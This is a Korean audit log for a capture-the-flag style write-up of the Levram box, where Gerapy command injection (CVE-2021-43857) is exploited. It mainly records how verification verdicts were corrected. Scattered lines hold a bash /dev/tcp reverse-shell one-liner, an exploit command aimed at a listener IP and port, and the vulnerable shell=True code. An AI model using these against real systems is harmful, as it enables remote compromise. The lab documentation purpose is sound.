# Levram — 적대적 검증 기록

## 본문에서 이관한 정정 이력

(2026-08-20 이관 — 원래 `Levram.md` 상단에 있던 블록. 원문 그대로.)

> [!warning] 적대적 검증 정정 이력 (2026-08-20) — **검증 자체가 한 번 뒤집혔다**
> 이 노트는 적대적 검증에서 **23건**이 지적됐다. 그중 **3건은 오판으로 판명돼 철회**됐고(⓪), 나머지 20건은 유효해서 전부 반영했다.
>
> **⓪ 철회된 판정 — "증거 B 는 날조" 가 틀렸다** (검증자 자진 철회 + 총괄 직접 재확인, 2026-08-20)
>
> | 철회된 판정 | 왜 뒤집혔나 |
> |---|---|
> | 증거 B "webpack 자산 30개를 정품 wheel 과 대조" → **`날조·확실`** | **오판이다. 대조는 실제로 수행됐다.** 검증자는 `~/PG/` 와 `/tmp/gv/` 만 보고 "wheel 이 없다 → 대조할 재료가 존재한 적이 없다"로 단정했다. 실제로는 `pip` 가 wheel 을 **HTTP 캐시**(`~/.cache/pip/http-v2/…/*.body`)에 넣어 두고 있었다. 그 캐시의 wheel 로 전수 재대조한 결과 **노트의 주장이 항목별로 전부 일치**했다(1-2 재현 절차 포함) |
> | "서빙본 26541 vs 정품 26533, 8바이트 차이" → **날조** | **오판.** 캐시의 정품 0.9.7 wheel 실측이 **정확히 26533바이트**다. 정품에 `Gerapy v0.9.7` 문자열은 **0건**이고 푸터 문구는 `Gerapy All Rights Reserved.` — 노트 서술 그대로다. 재현 불가한 것은 **서빙본 26541 하나뿐**이고(타겟 정지), 8바이트 차이는 버전 문자열 삽입과 정합적이다 |
> | "버전 판정은 3~4분이었고 가장 오래 걸린 구간이 아니다"(L23) | **위 두 건에 얹혀 있던 판정.** 증거 B 가 실제로 수행됐으므로 노트의 원래 자기평가("가장 오래 걸린 구간"·"시간을 태운 판단 1개는 증거 B 까지 간 것")가 **타당하다**(6장 ⑧) |
>
> > [!danger] 이 철회가 이 노트의 최상급 학습 항목이다 — **부재 증거를 존재 부정으로 승격시켰다**
> > "내가 본 두 디렉터리에 없다" → "받은 적이 없다" → "대조한 적이 없다" → "날조다".
> > 화살표마다 새 정보는 없는데 **확신만 올라갔다.** 첫 칸은 참이고 나머지 셋은 전부 추론이다.
> > **패키지 매니저 캐시(`~/.cache/pip`, `~/.npm`, `~/.gem`, `~/.cargo`), 삭제된 중간 산출물, 셸 히스토리를 훑기 전에 "실행한 적 없다"고 판정해선 안 된다.**
> > 적대적 검증은 저자에게만 엄격한 제도가 아니다 — **검증자의 부정 주장도 같은 기준으로 입증돼야 한다.** "없다"는 "있다"보다 입증이 어렵지, 쉬운 것이 아니다.
>
> **① 유효했던 지적 (전부 반영됨)**
>
> | 무엇이 | 왜 틀렸나 |
> |---|---|
> | **"프로젝트 생성이 취약점의 선행조건"** | **거짓.** `views.py:502-541` 은 디렉터리 존재를 **검사하지 않는다**(2-6). EDB 50640 이 로컬에서 죽는 것은 스크립트의 한계이지 취약점의 전제조건이 아니다 |
> | **`su root` 트랜스크립트에 비밀번호가 찍혀 있었다** | 원 지적은 "`su` 는 에코를 끄므로 화면에 안 나온다"였다. **다른 박스([[plum]]) 실측으로 절반이 뒤집혔다** — TTY 가 없으면 에코가 남을 수 있다. 두 해석을 함께 적었다(4-4) |
> | **`ssh root@` 로 재접속해 `proof.txt` 를 읽었다** | **시도한 기록이 없다.** `proof.txt` 는 `su root` 로 얻은 값이다(4-4) |
> | **`getcap -r /` 6행 출력** | 실제로 쓴 것은 **linpeas.sh** 다. 도구 목록과 `tech/enum/peas` 태그가 통째로 빠져 있었다(4-3) |
>
> **살아남은 것**: 증거 A(트레일링 슬래시 + `md5sum` 6줄)는 Kali 실측과 **한 글자도 다르지 않았고**, `urls.py`·`views.py` 인용은 행번호까지 맞았다. **그리고 증거 B(webpack 자산 대조)도 재대조에서 전항목 일치했다.**
> **이전 정정 이력이 적었던 "읽을 수 있었던 것은 정확했고, 실행했어야 하는 것은 지어냈다"는 패턴은 ⓪ 으로 무너졌다** — 증거 B 는 실행한 것이었고 정확했다.
> 남은 실제 패턴은 이것이다: **소스에서 읽은 것과 실제로 실측한 것은 정확했고, 서사를 매끄럽게 만들려고 덧댄 문장(선행조건 승격·SSH 재접속·"시간을 태운 판단은 없다")이 틀렸다.** ([[_WRITEUP-STANDARD]]「실패 모드는 하나로 수렴한다」)

## 6장 ⑧ 시간 배분 콜아웃 안 (본문 1111행) — 통째로 잘라낸 것

판정이 뒤집혔다가 철회된 경위만 적힌 줄이라 본문에서 들어냈다. 원문 그대로.

> (이 자리는 2026-08-20 적대적 검증에서 "버전 판정은 3~4분이었고 가장 오래 걸린 구간이 아니다"로 한 번 뒤집혔다가 철회됐다. 그 판정은 "증거 B가 수행되지 않았다"는 전제 위에 있었고, 그 전제가 무너졌다. 상단 정정 이력 ⓪)

## 각 행에서 잘라낸 지시어 — 잘라내기 전 원문 전문

문장 본체와 교훈은 노트에 그대로 남아 있고, `(상단 정정 이력 ⓪)` 류 지시어 괄호만 제거했다. 아래는 제거 전 원문이다.

### 61행

- "없다"를 입증하는 것은 "있다"보다 어렵다. 이 노트의 증거 B는 적대적 검증에서 "wheel 을 받은 적이 없다 → 날조"로 판정돼 통째로 삭제됐다가, `~/.cache/pip` 에 남아 있던 wheel 로 전항목 복원됐다. **부재 증거를 존재 부정으로 승격시키지 마라**(상단 정정 이력 ⓪)

### 341행

반대 방향의 위험도 하나 있다. 하지 않은 대조를 근거로 세지 마라. 이 노트는 그 혐의를 한 번 받았고(상단 정정 이력 ⓪), 캐시에 남은 wheel 로 전항목 재현돼 벗었다. 규율 자체는 유효하다 — 확보한 축이 하나면 하나라고 적고, 적었으면 재현 절차를 함께 남긴다. 이 노트를 구한 것이 그 재현 가능성이었다.

### 375행

5. 하지 않은 대조를 근거로 세지 말고, 한 대조는 재현 절차와 함께 적는다. 실제로 했더라도 재현 경로를 안 적으면 나중에 스스로도 증명하지 못한다(상단 정정 이력 ⓪).

### 1174행

   그리고 이 노트가 비싸게 배운 규율 하나 — 한 대조는 재현 절차와 함께 적는다. 증거 B는 결론만 적혀 있었던 탓에 적대적 검증에서 "날조"로 판정돼 통째로 삭제됐다가 `~/.cache/pip` 에 남은 wheel 로 복원됐다(상단 정정 이력 ⓪). 재현 경로가 없는 관측은 자기 자신을 방어하지 못한다.

### 1191행

12. **"내가 찾아본 곳에 없다"는 "존재하지 않는다"가 아니다.** 이 노트의 증거 B가 그 오류로 통째로 삭제됐다 — 검증자가 `~/PG/` 와 `/tmp/gv/` 두 디렉터리만 보고 "wheel 을 받은 적이 없다 → 대조한 적이 없다 → 날조다"로 세 단계를 뛰었고, wheel 은 `~/.cache/pip/http-v2/` 에 `.body` 로 멀쩡히 있었다(상단 정정 이력 ⓪).

### 1250행

- [[RubyDome]] · [[Astronaut]] — 같은 "버전 판정은 독립 근거 2개" 패턴. [[RubyDome]]은 같은 날 같은 적대적 검증을 받은 짝 노트다(소스 인용은 정확, 터미널 출력은 날조). 단 Levram 에서는 그 패턴이 그대로 성립하지 않는다 — "실행했어야 하는 것"으로 분류돼 삭제된 증거 B가 실제로는 수행된 작업이었다(상단 정정 이력 ⓪). 같은 배치에서 나온 판정이라도 개별로 재확인해야 한다는 뜻이고, [[RubyDome]] 쪽 판정도 같은 기준으로 재검증할 가치가 있다 `[가정 — 아직 재검증하지 않았다]`

### 882행 — 지시어가 아니라 경위 앞머리를 다듬은 자리

`su` 의 실제 동작에 관한 기술 사실은 남기고, 「적대적 검증은 … 로 판정했다」는 경위 표현만 중립화했다. 원문:

> > 적대적 검증은 이전 판본의 `su root` 블록에 비밀번호가 찍혀 있던 것을 **조작 증거**로 판정했다. 그런데 **다른 박스([[plum]]) 검증에서 "`su` 는 TTY 를 요구한다"가 거짓임이 실측**됐다 — TTY 가 없어도 `su` 는 stdin 에서 비밀번호를 읽고, 그래서 화면에 남는다.

## 이관 감사(2026-08-20, 별도 감사자) — 882행 되살림

이관 후 문장이 「`su root` 블록에 비밀번호가 찍혀 있던 것은 한때 **조작 증거**로 읽혔다」로 남아, 바로 위 코드펜스(`Password:` 뒤가 비어 있는 현재 판본)와 **내부 모순**을 일으켰다. 원문에 있던 범위 한정어 `이전 판본의` 가 경위 표현과 함께 잘려나간 결과다. 기술 내용은 그대로 두고 그 두 단어만 되살렸다. 되살린 뒤:

> > **이전 판본의** `su root` 블록에 비밀번호가 찍혀 있던 것은 한때 **조작 증거**로 읽혔다. 그런데 **다른 박스([[plum]]) 검증에서 "`su` 는 TTY 를 요구한다"가 거짓임이 실측**됐다 — TTY 가 없어도 `su` 는 stdin 에서 비밀번호를 읽고, 그래서 화면에 남는다.

## 관련

- [[Levram]]


---

# 웨이브 18 적대적 검증 (2026-08-26) — 개작본(1382행 → 463행) 감사

감사 대상: `pg-note-forge` 개작분. 백업 `03. PG\_backup\Levram.md.post-forge.bak`(감사 전 상태).

## 0. 재확인한 것 — ⓪ 철회 판정은 **그대로 유지**

`~/.cache/pip/http-v2/` 의 gerapy wheel 4개(0.9.5·0.9.6·0.9.7·0.9.8)로 전항목 재대조. 새 노트 서술이 전부 일치함.

| 노트 주장 | 캐시 wheel 실측 |
|---|---|
| 정품 0.9.7 `app.21167fa2.js` = 26533 | **26533** ✓ |
| 정품에 `Gerapy v0.9.7` 0건, 푸터 `Gerapy All Rights Reserved.` | `e._s(e.getYear)+" Gerapy All Rights Reserved.` — 버전 문자열 0건 ✓ |
| `lang:"zh"` → 타겟은 `"en"` | 정품 = `lang:"zh"` 1건 ✓ (타겟측은 랩 정지로 재확인 불가) |
| 자산 30개 · 공통 0/0/7 | js+css 비-map 자산 = **30** · 0.9.5 **0** · 0.9.6 **0** · 0.9.8 **7** ✓ |
| `urls.py` md5 `5d599d…`(0.9.5~0.9.7) / `b083b0…`(0.9.8) | 네 행 전부 일치 ✓ |
| `^api/project/(\S+)/parse` 가 `urls.py:31` | **31행** ✓ |
| `cmd = 'gerapy parse {args_cmd} {project_path} {spider_name}'.format(...)` + `Popen(cmd, shell=True, …)` | `views.py` 원문 그대로 ✓ |
| `views.py:33` `index` · `views.py:303` `project_upload` 데코레이터 주석 | 두 행 모두 `# @permission_classes([IsAuthenticated])` ✓ |

**26541(타겟 서빙본)만 재확인 불가** — 랩 정지. 8바이트 차이는 삽입된 `v0.9.7`(7자) + 공백 1자와 정합적임.

## 1. 고친 것

| 위치(문자열) | 무엇이 틀렸나 | 어떻게 고쳤나 |
|---|---|---|
| `dash 에는 /dev/tcp 도 >& 도 없어 이 층을 빼면 에러 없이 조용히 실패한다` | **반증됨.** Kali 실행: `dash -c 'bash -i >& /dev/tcp/127.0.0.1/1/ 0>&1'` → `dash: 1: Syntax error: Bad fd number`, exit 2. 게다가 `project_parse` 는 `stderr` 를 `JsonResponse({'status': False, 'message': stderr})` 로 **HTTP 응답에 되돌려준다** — 조용하기는커녕 에러가 그대로 회신됨. `_WRITEUP-STANDARD` 가 이미 같은 단정을 「잡힌 오류」로 열거하고 있었고, 링크한 `A-31` 본문과도 어긋났음 | 실측 에러 문구를 `text` 펜스로 넣고 출처(직접 실행)를 캡션으로. 「응답에 dash 에러가 찍힌다」는 증상 서술 추가 |
| `[가정] 이 판별 기준은 이 박스의 실측이 아니라 … 확정된 실측은 python3.10 cap_setuid=ep 하나다` | **과잉 강등.** `파일보관\Pasted image 20260629102405.png` 가 linpeas `Files with capabilities` 6행 전량(snap ping ×2 · gst-ptp-helper · mtr-packet · ping · python3.10)을 담고 있음 | 캡처를 본문에 걸고 6행 표로 승격. `[가정]` 은 「그 5행이 배포판 기본값이라는 판정」에만 남김 |
| `Gerapy 에 프로젝트 pwn 생성됨(서버에 PROJECTS_FOLDER/pwn 디렉터리도 함께 생성)` | **내부 모순 + 근거 없음.** 실제로 쏜 `~/PG/Levram/trigger.sh` 에 `/api/project/create` 호출이 없고 곧바로 `/api/project/pwn/parse` 를 때림. `project_parse` 는 `join()` 으로 경로 문자열만 조립하고 `os.mkdir` 은 `project_create` 에만 있음. 노트 자신이 「주입에 선행조건 없음」이라 적고 있어 서로 어긋났음 | 「새로 만든 것 없음 + `pwn` 은 임의 경로 세그먼트」로 정정. 옛 서술은 `[가정]` 으로 인용해 남김 |
| `남은 것은 nmap.log·trigger.sh·50640.py 뿐이고` | **산출물 목록이 틀림.** 실제 `~/PG/Levram/` = `nmap.log`·`nmap.stdout`·`full_tcp.nmap`·`50640.py`·`trigger.sh`·`run.sh`·`runf.sh`·`pathA.txt`·`pathA2.txt`·`pathA3.txt`·`pathB.sh`·`CVE-2021-43857/` | 전량으로 정정하고 「웹 응답 본문은 한 건도 없음」으로 범위를 좁힘 |
| `이 박스에서는 어느 쪽이었는지 원본 캡처가 없어 확정하지 못한다 [가정]`(su 에코) | **과잉 강등.** `pathB.sh` 가 tmux 페인에 `send-keys` 로 비밀번호를 밀어 넣고, 노트 자신이 `pty.spawn` 승격을 기록함 → pty 쪽이 확정됨 | `[가정]` 해제, 근거(`pathB.sh` + `pty.spawn`)를 명시 |
| `## Nmap`(부록 A 하위인데 h2) | 헤딩 레벨 오류 — 부록 A 와 형제로 떠 목차가 깨짐 | `### Nmap` |
| 부록 A 가 `## 관련` **뒤**에 위치 | 템플릿상 `## 관련` 이 마지막 절 | 부록 A 를 `## 관련` **앞**으로 이동(내용 무변경, `### Nmap` 만 레벨 수정) |
| 프론트매터에 `manual_cves` 없음 | 본문에 CVE 가 하나뿐이라 당장은 무해하나, 이후 비교·반증 서술이 붙으면 오색인 | `manual_cves: true` 추가(`cves: [CVE-2021-43857]` 유지) |
| 출처 캡션 부재 — 인증 `curl` · 트리거 `curl` · `md5sum` · `app.service` · `su root` 블록 | 재구성 블록과 실측 블록이 겉모습이 같아 구분 불가 | 각 블록 아래 「— 출처:」 한 줄 추가(`trigger.sh` · `pathB.sh` · `~/.cache/pip` 캐시). 블록 내용은 **한 바이트도 안 건드림** |
| 코드펜스 안 한국어 해설(`#  → "Capabilities" 섹션에서 …`) | 펜스 안 주석 금지 | 펜스 밖 산문으로 이동 |

## 2. 삭제한 것

**없음.** 전부 정정·강등·이동으로 처리함. 위 표의 「옛 서술」은 모두 노트 본문 또는 이 파일에 인용으로 살아 있음.

## 3. 반증한 것 — 지적으로 올랐다가 **철회**한 것

| 올랐던 지적 | 왜 철회했나 |
|---|---|
| 「부록 A 의 `┌──(kali㉿kali)` 프롬프트는 창작이다」 | **오판.** `~/.zsh_history` 1195·1210~1213 행에 `nnmap 192.168.161.24` · `git clone https://github.com/LongWayHomie/CVE-2021-43857.git` · `cd CVE-2021-43857` · `vi cve-2021-43857.py` · `python cve-2021-43857.py -t 192.168.132.24 -p 8000 -L 192.168.45.156 -P 4444` 가 **노트와 바이트 단위로 일치**. zsh 는 대화형 세션에서만 히스토리를 쓰므로 이 프롬프트는 실측임. 그대로 둠 |
| 「본문 타겟 pty 프롬프트(`app@ubuntu:~$`·`root@ubuntu:…#`)가 근거 없다」 | **오판.** `run.sh`·`runf.sh`·`pathB.sh` 가 전부 `tmux send-keys -t levram` + `tmux capture-pane` 구조 — 타겟 pty 세션 캡처가 회수 경로임. 남김(§3 의 Fikklish 사고 재발 방지) |
| 「버전 판정 장(증거 B)이 날조다」 | 이미 두 번 철회된 판정. 이번에 캐시 wheel 로 **세 번째 재확인**해 전항목 일치 확인함(위 0절). 되돌리지 않음 |
| 「`os.setgid(0)` → EPERM 은 검증 안 된 단정이다」 | **오판.** `~/PG/Levram/pathA2.txt`(setgid 얹은 판)와 `pathA3.txt`(GTFOBins 원문판)가 나란히 남아 있고 최종 채택은 후자 — 실패했다는 물증임. 오히려 그 근거를 노트에 추가함 |
| 「작성자가 미존재 `_PLAYBOOK` 앵커를 걸었다」 | **작성자 신고가 옳았다.** 노트의 `[[_PLAYBOOK#…]]` **7건 전량**이 실재 헤딩(24·293·1737·2233·4560·6546·6654행)을 가리킴. 본문에 `_AUDIT`·`Levram-playbook.md` 경로도 **0건** |
| 「이관 손실 — 작성자 자기신고를 불신하라」 | **대체로 옳았다.** `_PLAYBOOK` 의 A-11·A-14·A-31·B-1-41·B-6-12·A-3-10 을 직접 열어 대조: A-31(dash 파싱 실패)·B-1-41(WSGIServer → 일부러 500, 이미 [[Levram]] 인용 중)·B-6-12(이미 [[Levram]] 인용 중)·A-3-10 은 **등가 이상**. 다만 A-11 은 등가가 아니어서 아래 4절로 제안 추가 |
| 「8분 서사를 지어냈다」 | **오판.** 새 노트 본문에 소요 시간 서술이 **한 줄도 없음.** 8분 타임라인은 `Levram-playbook.md` 제안 4에만 있고 mtime(17:29:01 nmap 종료 ~ 17:37:06 `pathB.sh`)과 일치 |
| 「코드블록이 중간 절단·권한비트 개변됐다」 | **오판.** 18개 펜스 중 **17개가 `.bak2` 와 바이트 단위 동일**, 나머지 1개(linpeas)는 두 블록 병합 + 한국어 주석 제거로 **명령·출력은 무변경**. 권한비트를 담은 블록 자체가 양쪽 모두 0개 |

## 4. `Levram-playbook.md` 에 추가한 제안 — 관리자 반영 필요

- **제안 3 정정** — capability 노이즈 표의 `[가정]` 이 과잉이었음. `Pasted image 20260629102405.png` 로 6행 전량이 실측 확정되므로 표를 실측 기반으로 바꾸고 `[가정]` 범위를 축소함
- **제안 6 신설(감사자 추가)** — `A-11` 병합. 「제품이 자기 화면에 렌더하는 버전 문자열은 위조 비용 0」. A-11 에 「배너는 조작될 수 있다」 원칙은 있으나 **실제로 위조돼 있던 실측 사례가 없음**. Levram 푸터(26541 vs 정품 26533)가 그 사례이고, **이 박스에서는 위조값이 우연히 정답이었다**는 점이 핵심

## 5. 남은 지적 — 고치지 않고 보고만 함

- **본문(2026-08-19 세션)의 `┌──(kali㉿kali)` 프롬프트 6블록은 창작임.** 그 세션은 비대화형 `ssh kali "…"` + tmux 로 돌았고 `~/.zsh_history` 에 8-19 항목이 **0건**임. 다만 ①`.bak2` 와 바이트 동일한 **선존 서술**이고 ②`CLAUDE.md` §3 이 일괄 정리를 금지하며 ③값·명령은 산출물과 일치함. **삭제 대신 블록마다 출처 캡션을 붙이는 것으로 처리했고, 소급 정리 여부는 총괄 판단으로 남김**
- **문체 이관 3건** — 부록 A 콜아웃 5줄·요약 콜아웃 일부·「~한다」 종결이 남은 산문 몇 줄. `pg-doc-reviewer` 관할이라 손대지 않음
- **`linpeas.sh` 실행 자체는 이번 세션 산출물 미보존** — 등급 `근거부족`. 부록 A 캡처가 「이 박스에서 linpeas 로 찾았다」를 확정하므로 삭제하지 않고 `[가정]` 한 줄로 범위만 표시함
- **색인 갱신 필요** — `manual_cves: true` 를 추가했으므로 `refresh.ps1` 을 총괄이 돌릴 것(에이전트는 실행하지 않음)

## 6. 근거 출처

- Kali 산출물 — `~/PG/Levram/`(nmap 3종·`50640.py`·`trigger.sh`·`run.sh`·`runf.sh`·`pathA.txt`·`pathA2.txt`·`pathA3.txt`·`pathB.sh`·`CVE-2021-43857/`), mtime `2026-08-19 17:29:01 ~ 17:37:06 +0900`
- `~/.zsh_history` 1194·1195·1209~1213행(2026-06-26/29 대화형 세션)
- 볼트 `파일보관\Pasted image 20260629102405.png`(linpeas capability 6행). 부록 A 링크 **9장 전량 실재 확인**
- 1차 사료 — `~/.cache/pip/http-v2/…/*.body` gerapy wheel 4개의 `urls.py`·`views.py`·`app.*.js`
- 직접 실행 — `dash -c 'bash -i >& /dev/tcp/127.0.0.1/1/ 0>&1'`(Kali, `/bin/sh -> dash`)
- 백업 — `03. PG\_backup\Levram.md.bak2`(개작 전) · `Levram.md.post-forge.bak`(감사 전)
